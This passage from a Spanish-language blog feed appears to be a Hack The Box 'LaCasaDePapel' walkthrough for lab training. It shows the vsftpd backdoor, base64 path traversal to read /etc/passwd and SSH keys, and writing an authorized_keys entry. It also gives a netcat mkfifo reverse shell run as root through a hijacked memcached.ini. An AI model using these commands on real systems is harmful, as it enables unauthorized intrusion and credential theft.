</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/fortune/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/fortune/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - LaCasaDePapel</title>
        <link>https://sckull.github.io/posts/lacasadepapel/</link>
        <pubDate>Sat, 27 Jul 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 27 Jul 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lacasadepapel/</guid>
        <description>LaCasaDePapel es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;LaCasaDePapel es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;LaCasaDePapel&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.131&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/4615&#34;&gt;thek&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de todos los puertos tcp/udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.131 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 443/tcp on 10.10.10.131                                   
Discovered open port 22/tcp on 10.10.10.131                                    
Discovered open port 80/tcp on 10.10.10.131                                    
Discovered open port 21/tcp on 10.10.10.131
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos encontrados con MASSCAN.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST
Nmap scan report for 10.10.10.131
Host is up (0.22s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da🇩🇪be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js Express framework
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Agregamos lacasadepapel.htb a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;https&#34;&gt;HTTPS&lt;/h2&gt;
&lt;p&gt;Al visitar la pagina en https nos muestra un error de certificado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2018.01.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Al visitar la pagina nos muestra una imagen QR.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-03-31%2023.41.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Encontramos ftp en su version &lt;code&gt;vftpd 2.3.4&lt;/code&gt; el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de &lt;code&gt;Psy Shell&lt;/code&gt;, intentamos conectarnos al &lt;code&gt;puerto 6200&lt;/code&gt;, y encontramos una shell de Psysh,y con el comando dir la clase &lt;code&gt;$tokyo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/&#34;&gt;&lt;em&gt;Expliting Vsftpd&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/In2econd/vsftpd-2.3.4-exploit&#34;&gt;&lt;em&gt;Github - Exploit&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-01%2016.32.38.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el comando &amp;lsquo;show $tokyo&amp;rsquo; para mostrar el codigo que en este se encuentra.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-01%2016.37.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;class Tokyo {
	private function sign($caCert,$userCsr) {
    	$caKey = file_get_contents(&amp;#39;/home/nairobi/ca.key&amp;#39;);
    	$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [&amp;#39;digest_alg&amp;#39;=&amp;gt;&amp;#39;sha256&amp;#39;]);
    	openssl_x509_export($userCert, $userCertOut);
    	return $userCertOut;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: &lt;code&gt;file_get_contents(archivo)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2020.06.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2020.06.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html&#34;&gt;&lt;em&gt;IBM - Certificate&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/Soarez/9688998&#34;&gt;&lt;em&gt;Github - Certificate&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tecadmin.net/simple-steps-to-generate-csr-on-centos/&#34;&gt;&lt;em&gt;tecadmin - Certificate&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Generamos nuestro certificado para firefox con los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl req -key ca.key -new -x509 -days &lt;span class=&#34;m&#34;&gt;365&lt;/span&gt; -out lacasadepapelhtb.crt -subj &lt;span class=&#34;s2&#34;&gt;&amp;#34;/C=US/ST=New York/L=Brooklyn/O= La Casa De Papel/CN=lacasadepapel.htb&amp;#34;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl pkcs12 -export -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapelhtb.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Importamos nuestro certificado a firefox y al visitar la pagina nos muestra lo siguiente:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2020.02.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar SEASON-1 nos muestra una lista de videos en formato avi al visitar o dar click a uno de ellos nos descarga un archivo, vacio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2001.57.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;01.avi&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dicha url en su parte final (&lt;code&gt;/U0VBU09OLTEvMDEuYXZp&lt;/code&gt;) esta codificada en &lt;code&gt;base64&lt;/code&gt;, por lo que al decodificarla obtenemos el valor de &lt;code&gt;SESEASON-1/01.avi&lt;/code&gt;, sabiendo esto podemos codificar &lt;code&gt;../../../../etc/passwd&lt;/code&gt; en base64 para observar que pasa si codificamos una ruta de un archivo para descargarla.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2002.10.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Asi es como obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;, ahora que sabemos como descargar archivos vamos a descargar el &lt;code&gt;id_rsa&lt;/code&gt; (&lt;code&gt;../.ssh/id_rsa&lt;/code&gt;) del usuario &lt;code&gt;berlin&lt;/code&gt; y asi conectarnos mediante el servicio ssh.&lt;/p&gt;
&lt;p&gt;Por alguna razon el &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;berlin&lt;/code&gt; no funciona en si mismo, funciona con el usuario &lt;code&gt;professor&lt;/code&gt; y &lt;code&gt;dali&lt;/code&gt;. En el caso de dali debemos de agregar nuestra clave al archivo &lt;code&gt;authorized_keys&lt;/code&gt; mediante &lt;code&gt;PSYSH&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;usuario-dali-psysh&#34;&gt;USUARIO DALI PSYSH&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sitepoint.com/interactive-php-debugging-psysh/&#34;&gt;&lt;em&gt;Debugging Psysh&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$file = file_get_contents(&#39;/etc/passwd&#39;);echo $file;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.16.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar dicho archivo vemos que el usuario &lt;code&gt;dali&lt;/code&gt; tiene como shell psysh y su directorio principal es /home/dali.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/&#34;&gt;&lt;em&gt;etcpasswd format&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.17.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que sabemos que psysh es ejecutado por el usuario dali y tenemos acceso a su directorio principal, podemos generar y agregar nuestra &lt;code&gt;id_rsa.pub&lt;/code&gt; a el archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario &lt;code&gt;dali&lt;/code&gt;, para luego poder conectarnos por medio de ssh.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.29.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$text = &amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull&amp;#34;;$filename = &amp;#34;/home/dali/.ssh/authorized_keys&amp;#34;;$fh = fopen($filename, &amp;#34;a&amp;#34;);fwrite($fh, $text);fclose($fh);
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escribimos y verificamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.31.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora nos conectamos con la clave de &amp;lsquo;berlin&amp;rsquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.27.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;usuario-professor---ssh&#34;&gt;USUARIO PROFESSOR - SSH&lt;/h2&gt;
&lt;p&gt;Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.29.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---flag&#34;&gt;USER - FLAG&lt;/h2&gt;
&lt;p&gt;Al enumerar las carpetas de los usuarios encontramos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt; en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.38.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos pspy64 para ver los crons que se ejecutan.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.52.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un proceso que se ejecuta que utiliza node y un archivo &lt;code&gt;memcached.js&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.00.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo memcached.js se encuentra en nuestra carpeta principal (&lt;code&gt;/home/professor&lt;/code&gt;) pero no tenemos permisos, tambien se encuentra otro archivo llamadao &lt;code&gt;memcached.ini&lt;/code&gt; que contiene un comando que ejecuta node con el archivo &lt;code&gt;memcached.js&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.03.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una prueba de ping con el usuario root a nuestra ip, agregamos lo siguiente a memcached.ini, pero primero renombramos el archivo anterior a otro ya que no tenemos permisos, creamos un nuevo archivo con el mismo nombre y agregamos lo siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.45.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y obtenemos la respuesta de la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.44.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener una shell inversa creamos un archivo con nuestra shell inversa dentro, y agregamos su ejecucion dentro del archivo &lt;code&gt;memcached.ini&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;batman.sh&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.12.119 7878 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &amp;gt; /tmp/batman.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;memcached.ini
[program:memcached]
command = sudo -u root sh /tmp/batman.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.50.49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.49.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - FriendZone</title>
        <link>https://sckull.github.io/posts/friendzone/</link>
        <pubDate>Sat, 13 Jul 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 13 Jul 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/friendzone/</guid>
        <description>FriendZone es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;FriendZone es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;FriendZone&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.123&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/17292&#34;&gt;askar&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
